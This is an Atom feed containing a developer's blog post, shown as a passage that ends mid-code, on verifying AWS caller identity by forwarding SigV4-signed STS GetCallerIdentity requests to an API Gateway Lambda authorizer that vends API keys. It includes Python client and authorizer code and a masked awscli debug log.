<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://ahermosilla.com/feed.xml" rel="self" type="application/atom+xml" /><link href="http://ahermosilla.com/" rel="alternate" type="text/html" /><updated>2025-05-16T20:14:23+00:00</updated><id>http://ahermosilla.com/feed.xml</id><title type="html">Andres Hermosilla | brain –archive</title><subtitle>Hi there, this is where I archive some of my brain records on development and design topics I've been working through. Some of these thoughts are raw as I'm evolving and others  are refined from years of experience.
</subtitle><entry><title type="html">Leveraging AWS signed requests for Identity Proof</title><link href="http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests.html" rel="alternate" type="text/html" title="Leveraging AWS signed requests for Identity Proof" /><published>2020-11-17T00:00:00+00:00</published><updated>2020-11-17T00:00:00+00:00</updated><id>http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests</id><content type="html" xml:base="http://ahermosilla.com/cloud/2020/11/17/leveraging-aws-signed-requests.html"><![CDATA[<p><img src="/assets/img/aws-sts-header.png" alt="RDP" /></p>

<p>I was working on an internal API that I wanted to make available for other ops team members. The security team has their own AWS account and ops have their own AWS accounts as well as the various product teams business units. I wanted to, with little effort, enable teams to use my API which was built on AWS API Gateway + AWS Lambda. There is no need for granular authorization since the API is readonly so I configured the API Gateway to use API Keys. I wanted to have self-service API key generation, where the user could generate their own API key with their username as the key name.</p>

<p>Previously, I have used IAM permissions to enable other teams in our same AWS organization to read objects from an S3 Bucket (<a href="https://gist.github.com/rezen/018c4bf5e98de4c04baacf678df8b80f">See sample here</a>). I figured there had to be similar constructs that could be leveraged to enable users to generate API keys with their AWS authentication material (aws_access_key_id,aws_secret_access_key,aws_session_token). One bit that made this less straightforward was I wanted to create a key with the username of the actor. How could I get a verified username and not just a random username supplied by an actor.</p>

<p>If you are familiar with <code class="language-plaintext highlighter-rouge">awscli</code> and have had to work with multiple accounts and use temporary credentials from STS you have probably used <code class="language-plaintext highlighter-rouge">aws sts get-caller-identity</code>. I like to think of it as the <code class="language-plaintext highlighter-rouge">whoami</code> of AWS. I interact with many accounts so sometimes I have to check and remember what role &amp; account a session is connected to. I figured there had to be a way to build that request and send that to a key generation endpoint which would pass it on to AWS and then get the identity out of the response back.</p>

<h3 id="aws-signed-requests">AWS Signed Requests</h3>
<p>After doing some research, my assumptions were confirmed, the answers lied within how AWS’ API worked with signed requests. Before we jump into that, I want to take a step back.  When you use <code class="language-plaintext highlighter-rouge">boto3</code> or <code class="language-plaintext highlighter-rouge">awscli</code>  or any other AWS library, they are just wrappers for AWS APIs. When you interact with those APIs, your credential material is not used in the same way as it is frequently with other APIs. For example, when you generate API tokens for Github, when you use the token, it will look something like this.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Authorization: token XXXXXXXXXXX"</span> https://api.github.com
</code></pre></div></div>

<p>With AWS APIs, you don’t send your credential material in that way, as explained in their docs.</p>

<blockquote>
  <p>When you send HTTP requests to AWS, you sign the requests so that AWS can identify who sent them. You sign requests with your AWS access key, which consists of an access key ID and secret access key.
https://docs.amazonaws.cn/en_us/general/latest/gr/signing_aws_api_requests.html</p>
</blockquote>

<p>AWS states the following reasons for using signed requests:</p>
<ul>
  <li>Verify the identity of the requester</li>
  <li>Protect data in transit</li>
  <li>Protect against potential replay attacks</li>
</ul>

<h4 id="request-signing">Request Signing</h4>
<p>I’m not going to go into the details of how to make signed requests, here are the docs and some examples you can check out. Essentially the url (with params), body &amp; headers need to be signed, it’s not terribly hard to follow along and implement yourself.</p>

<ul>
  <li>https://docs.aws.amazon.com/general/latest/gr/sigv4_signing.html</li>
  <li>https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html</li>
  <li>https://github.com/boto/botocore/blob/develop/botocore/auth.py#L151</li>
</ul>

<p>To get an idea of what a request looks like you can use <code class="language-plaintext highlighter-rouge">--debug</code> flag with the <code class="language-plaintext highlighter-rouge">aws sts get-caller-identity</code>. As debug output is being generated you should see <code class="language-plaintext highlighter-rouge">Calculating signature using v4 auth</code> and from there you can see the details of the request.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> aws <span class="nt">--debug</span> sts get-caller-identity
<span class="nt">---</span> snip <span class="nt">---</span>
2020-11-16 15:09:44,909 - MainThread - botocore.auth - DEBUG - Calculating signature using v4 auth.
2020-11-16 15:09:44,909 - MainThread - botocore.auth - DEBUG - CanonicalRequest:
POST
/

content-type:application/x-www-form-urlencoded<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
host:sts.amazonaws.com
x-amz-date:20201116T230944Z
x-amz-security-token:<span class="k">**************************</span>

content-type<span class="p">;</span>host<span class="p">;</span>x-amz-date<span class="p">;</span>x-amz-security-token
ab821ae955788b0e33ebd34c208442ccfc2d406<span class="k">***************</span>
2020-11-16 15:09:44,909 - MainThread - botocore.auth - DEBUG - StringToSign:
AWS4-HMAC-SHA256
20201116T230944Z
20201116/us-east-1/sts/aws4_request
45dd2e3a3e33191062c6a6b8d88adfee856877d<span class="k">****************</span>
2020-11-16 15:09:44,909 - MainThread - botocore.auth - DEBUG - Signature:
5ef29f57c5df6bd4283faa328e8a74ea940dcac695fc71d70<span class="k">*************</span>
2020-11-16 15:09:44,909 - MainThread - botocore.endpoint - DEBUG - Sending http request: &lt;AWSPreparedRequest <span class="nv">stream_output</span><span class="o">=</span>False, <span class="nv">method</span><span class="o">=</span>POST, <span class="nv">url</span><span class="o">=</span>https://sts.amazonaws.com/, <span class="nv">headers</span><span class="o">={</span><span class="s1">'Content-Type'</span>: b<span class="s1">'application/x-www-form-urlencoded; charset=utf-8'</span>, <span class="s1">'User-Agent'</span>: b<span class="s1">'aws-cli/1.18.122 Python/3.8.5 Darwin/18.7.0 botocore/1.13.50'</span>, <span class="s1">'X-Amz-Date'</span>: b<span class="s1">'20201116T230944Z'</span>, <span class="s1">'X-Amz-Security-Token'</span>: b<span class="s1">'********************'</span>, <span class="s1">'Authorization'</span>: b<span class="s1">'AWS4-HMAC-SHA256 Credential=ASIASBWKLLBJOPCMUUVR/20201116/us-east-1/sts/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-security-token, Signature=5ef29f57c5df6bd4283faa328e8a74ea940dcac695fc71d70*************'</span>, <span class="s1">'Content-Length'</span>: <span class="s1">'43'</span><span class="o">}&gt;</span>
2020-11-16 15:09:44,910 - MainThread - urllib3.connectionpool - DEBUG - Starting new HTTPS connection <span class="o">(</span>1<span class="o">)</span>: sts.amazonaws.com:443
2020-11-16 15:09:45,338 - MainThread - urllib3.connectionpool - DEBUG - https://sts.amazonaws.com:443 <span class="s2">"POST / HTTP/1.1"</span> 200 465
2020-11-16 15:09:45,339 - MainThread - botocore.parsers - DEBUG - Response headers: <span class="o">{</span><span class="s1">'x-amzn-RequestId'</span>: <span class="s1">'17d14169-3a03-421d-837e-a*****'</span>, <span class="s1">'Content-Type'</span>: <span class="s1">'text/xml'</span>, <span class="s1">'Content-Length'</span>: <span class="s1">'465'</span>, <span class="s1">'Date'</span>: <span class="s1">'Tue, 17 Nov 2020 00:57:17 GMT'</span><span class="o">}</span>
2020-11-16 16:57:17,451 - MainThread - botocore.parsers - DEBUG - Response body:
b<span class="s1">'&lt;GetCallerIdentityResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/"&gt;\n  &lt;GetCallerIdentityResult&gt;\n    &lt;Arn&gt;arn:aws:sts::1499999991:assumed-role/ReadOnly/ahermosilla@example.com&lt;/Arn&gt;\n    &lt;UserId&gt;AROASBWKLLBJFBLYSYIDR:ahermosilla@example.com&lt;/UserId&gt;\n    &lt;Account&gt;1499999991&lt;/Account&gt;\n  &lt;/GetCallerIdentityResult&gt;\n  &lt;ResponseMetadata&gt;\n    &lt;RequestId&gt;8f4dec63-58a0-49b1-8e31-dea0a309b7bc&lt;/RequestId&gt;\n  &lt;/ResponseMetadata&gt;\n&lt;/GetCallerIdentityResponse&gt;\n'</span>
2020-11-16 16:57:17,452 - MainThread - botocore.hooks - DEBUG - Event needs-retry.sts.GetCallerIdentity: calling handler &lt;botocore.retryhandler.RetryHandler object at 0x10b6c1ca0&gt;
2020-11-16 16:57:17,452 - MainThread - botocore.retryhandler - DEBUG - No retry needed.
2020-11-16 16:57:17,453 - MainThread - awscli.formatter - DEBUG - RequestId: 8f4dec63-58a0-49b1-8e31-dea0a309b7bc
<span class="o">{</span>
    <span class="s2">"UserId"</span>: <span class="s2">"AROASBWKLLBJFBLYSYIDX:ahermosilla@example.com"</span>,
    <span class="s2">"Account"</span>: <span class="s2">"1499999991"</span>,
    <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:sts::1499999991:assumed-role/ReadOnly/ahermosilla@example.com"</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The debug output provides a good idea of the shape of a request to an AWS API.  We know  (and verified) requests are signed with our credential materials which means we could hand off that request to another service and not worry about that service tampering with the request or making requests to other APIs since AWS verifies the signature of the request. (You should also notice the object <code class="language-plaintext highlighter-rouge">AWSPreparedRequest</code> is referenced in the logs, hinting at what class boto is using to construct the request.)</p>

<h4 id="an-aside-on-s3">An aside on S3</h4>
<p>Outside of signed requests happening “under the hood” with boto and awscli, one place you have probably seen signed requests is with S3. It is a common pattern for applications to store files in S3 and then later provide access to the user to those files. Instead of having a route pass the file through (incurring additional network latency) you can create a <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/guide/s3-presigned-urls.html">presigned url</a> and the user hits AWS directly to download the file. This pattern is also leveraged to enable end users to <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/guide/s3-presigned-urls.html#generating-a-presigned-url-to-upload-a-file">directly upload files</a> to your S3 bucket with parameters you specify.</p>

<p><strong>STS API</strong><br />
AWS has thorough docs of all their APIs (https://docs.aws.amazon.com/), but the one specifically we are looking for is the one around <code class="language-plaintext highlighter-rouge">get-caller-identity</code> which can be found here https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html. If you compare the API examples versus the output from the last request you see they match up, we can verify this is the API we want to build the request for.</p>

<p>Unlike the examples of S3 mentioned above, where a service is providing signed urls for the user to interact with an AWS account’s resources, we want the user to provide a signed request to act as bearer of their identity. We want to know they are part of organization <strong>X</strong> and have <strong>Y</strong> assumed role before we vend them an API key. Our endpoint is going to pass on the signed request with the response as bearer proof of identity, inspecting the response to verify the actor’s identity is allowed to interact with our API.</p>

<h3 id="use-botocore-to-create-client">Use Botocore to create client</h3>
<p>Now we could put together all pieces ourselves starting from the example for creating signed requests, but why? We know <strong>boto</strong> already has the pieces for creating signed requests so let’s go ahead and leverage it. We need to build the request like we are going send it to STS, but then send it to our endpoint instead.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">from</span> <span class="n">botocore.auth</span> <span class="kn">import</span> <span class="n">SigV4Auth</span>
<span class="kn">from</span> <span class="n">botocore.awsrequest</span> <span class="kn">import</span> <span class="n">AWSRequest</span>
<span class="kn">from</span> <span class="n">botocore.credentials</span> <span class="kn">import</span> <span class="n">get_credentials</span>
<span class="kn">from</span> <span class="n">botocore.endpoint</span> <span class="kn">import</span> <span class="n">URLLib3Session</span>
<span class="kn">import</span> <span class="n">boto3</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
<span class="n">credentials</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get_credentials</span><span class="p">()</span>
<span class="n">credentials</span> <span class="o">=</span> <span class="n">credentials</span><span class="p">.</span><span class="nf">get_frozen_credentials</span><span class="p">()</span>
<span class="n">signer</span> <span class="o">=</span> <span class="nc">SigV4Auth</span><span class="p">(</span><span class="n">credentials</span><span class="p">,</span> <span class="sh">'</span><span class="s">sts</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">us-east-1</span><span class="sh">'</span><span class="p">)</span>

<span class="n">endpoint</span> <span class="o">=</span> <span class="sh">'</span><span class="s">api.example.com</span><span class="sh">'</span>
<span class="n">request</span> <span class="o">=</span> <span class="nc">AWSRequest</span><span class="p">(</span>
    <span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span> 
    <span class="n">url</span><span class="o">=</span><span class="sh">"</span><span class="s">https://sts.amazonaws.com/</span><span class="sh">"</span><span class="p">,</span> 
    <span class="n">data</span><span class="o">=</span><span class="sh">"</span><span class="s">Action=GetCallerIdentity&amp;Version=2011-06-15</span><span class="sh">"</span><span class="p">,</span> 
    <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
        <span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">sts.amazonaws.com</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded; charset=utf-8</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">X-Audience</span><span class="sh">'</span><span class="p">:</span> <span class="n">endpoint</span><span class="p">,</span>
    <span class="p">}</span>
<span class="p">)</span>
<span class="n">signer</span><span class="p">.</span><span class="nf">add_auth</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>

<span class="k">if</span> <span class="sh">'</span><span class="s">dev</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">PY_ENV</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>

<span class="c1"># To send to STS directly ....
# sender = URLLib3Session()
# response = sender.send(request.prepare())
</span>
<span class="c1"># To send to our API, we use the request boto created with the 
# signature components
</span><span class="n">headers</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
<span class="n">headers</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">https://</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s">/key</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p>The endpoint needs to pull out the headers authorization, x-amz-date, x-amz-security-token, x-audience to pass on to the STS API. Our endpoint is on a different host, so we don’t use that, rather we use <code class="language-plaintext highlighter-rouge">sts.amazonaws.com</code>, but the other parts are part of the original request to STS. Below is an example implementation of passing on the identity request on to AWS STS. This shows an example using <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-use-lambda-authorizer.html">API Gateway Authorizer</a> to authorize request paths. There is an endpoint to <code class="language-plaintext highlighter-rouge">POST /key</code> which will is behind this authorizer which will receive the identity (passed from the authorize context) in it’s handler context.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">boto3</span>
<span class="kn">import</span> <span class="n">http.client</span>
<span class="kn">import</span> <span class="n">urllib.parse</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>

<span class="k">def</span> <span class="nf">deny_response</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">{</span>
    	<span class="sh">"</span><span class="s">policyDocument</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
    		<span class="sh">"</span><span class="s">Version</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">2012-10-17</span><span class="sh">"</span><span class="p">,</span>
    		<span class="sh">"</span><span class="s">Statement</span><span class="sh">"</span><span class="p">:</span> <span class="p">[</span>
    			<span class="p">{</span>
    				<span class="sh">"</span><span class="s">Action</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">execute-api:Invoke</span><span class="sh">"</span><span class="p">,</span>
    				<span class="sh">"</span><span class="s">Effect</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Deny</span><span class="sh">"</span><span class="p">,</span>
    				<span class="sh">"</span><span class="s">Resource</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">*</span><span class="sh">"</span><span class="p">,</span>
    			<span class="p">}</span>
    		<span class="p">]</span>
    	<span class="p">},</span>
    	<span class="sh">"</span><span class="s">context</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
    	    <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="sh">'</span>
    	<span class="p">}</span>
    <span class="p">}</span>

<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="n">authorized_accounts</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">AUTHD_ACCTS</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="n">a</span><span class="p">]</span>
    <span class="n">authorized_roles</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">AUTHD_ROLES</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="n">r</span><span class="p">]</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="n">event</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">headers</span><span class="sh">'</span><span class="p">,</span> <span class="p">{})</span>

    <span class="c1"># Since API Gateway routes based on hostnames we know the host can be 
</span>    <span class="c1"># trusted. To be extra sure you could instead compare against
</span>    <span class="c1"># an environment variable of X_AUDIENCE 
</span>    <span class="n">host</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">host</span><span class="sh">'</span><span class="p">]</span> <span class="k">if</span> <span class="sh">'</span><span class="s">host</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">headers</span> <span class="k">else</span> <span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Host</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="c1"># For the client's safety, expect this header
</span>    <span class="k">if</span> <span class="sh">'</span><span class="s">x-audience</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Did not supply x-audience header</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">A x-audience header is required</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># ... and then assert the audience and the host are the same
</span>    <span class="c1"># This protects the client from host replay attacks
</span>    <span class="k">if</span> <span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">x-audience</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="n">host</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Mismatch with host and x-audience header - audience=</span><span class="si">{</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">x-audience</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="s"> host=</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="sh">"</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">Mismatch with host and x-audience header</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">keep</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">authorization</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">x-amz-date</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">x-amz-security-token</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">x-audience</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">keep</span> <span class="o">=</span> <span class="p">[</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">headers</span> <span class="k">if</span> <span class="n">k</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">keep</span><span class="p">]</span>
    
    <span class="n">authd</span> <span class="o">=</span> <span class="p">{</span><span class="n">k</span><span class="p">.</span><span class="nf">lower</span><span class="p">():</span> <span class="n">headers</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">keep</span> <span class="k">if</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">}</span>
    
    <span class="k">if</span> <span class="sh">'</span><span class="s">x-authorization</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
        <span class="n">authd</span><span class="p">[</span><span class="sh">'</span><span class="s">authorization</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">x-authorization</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="sh">'</span><span class="s">authorization</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">authd</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No authorization provided</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">No authorization header provided</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="sh">'</span><span class="s">x-audience</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">authd</span><span class="p">[</span><span class="sh">'</span><span class="s">authorization</span><span class="sh">'</span><span class="p">]:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The header x-audience was not included in the signature</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">The header x-audience was not included in the signature</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">params</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">urlencode</span><span class="p">({</span> 
        <span class="sh">'</span><span class="s">Action</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">GetCallerIdentity</span><span class="sh">"</span><span class="p">,</span> 
        <span class="sh">'</span><span class="s">Version</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">2011-06-15</span><span class="sh">"</span> 
    <span class="p">})</span>

    <span class="n">authd</span><span class="p">[</span><span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Boto3/1.10.28 Python/3.8.5 Darwin/18.7.0 Botocore/1.13.50</span><span class="sh">'</span>
    <span class="n">authd</span><span class="p">[</span><span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">identity</span><span class="sh">'</span>
    <span class="n">authd</span><span class="p">[</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">application/x-www-form-urlencoded; charset=utf-8</span><span class="sh">"</span>
    <span class="n">authd</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="nc">HTTPSConnection</span><span class="p">(</span><span class="sh">"</span><span class="s">sts.amazonaws.com</span><span class="sh">"</span><span class="p">)</span> 
    <span class="n">conn</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">authd</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">getresponse</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">status</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">reason</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="nf">getheaders</span><span class="p">())</span>

    <span class="k">if</span> <span class="sh">"</span><span class="s">ExpiredToken</span><span class="sh">"</span> <span class="ow">in</span> <span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Using expired tokens ....</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">The token provided is expired</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Request was not successful with sts</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">Request STS failed</span><span class="sh">"</span><span class="p">)</span>
    
    
    <span class="n">tree</span> <span class="o">=</span> <span class="n">ET</span><span class="p">.</span><span class="nc">ElementTree</span><span class="p">(</span><span class="n">ET</span><span class="p">.</span><span class="nf">fromstring</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">tree</span><span class="p">.</span><span class="nf">getroot</span><span class="p">()</span>
    <span class="n">nodes</span> <span class="o">=</span> <span class="p">[</span><span class="n">n</span><span class="p">.</span><span class="nf">getchildren</span><span class="p">()</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">root</span> <span class="k">if</span> <span class="n">n</span><span class="p">.</span><span class="n">tag</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GetCallerIdentityResult</span><span class="sh">"</span><span class="p">].</span><span class="nf">pop</span><span class="p">()</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">nodes</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No nodes?</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">deny_response</span><span class="p">(</span><span class="sh">"</span><span class="s">STS response not validated</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="n">n</span><span class="p">.</span><span class="n">tag</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">}</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span> <span class="n">n</span><span class="p">.</span><span class="n">text</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">nodes</span><span class="p">}</span>
    
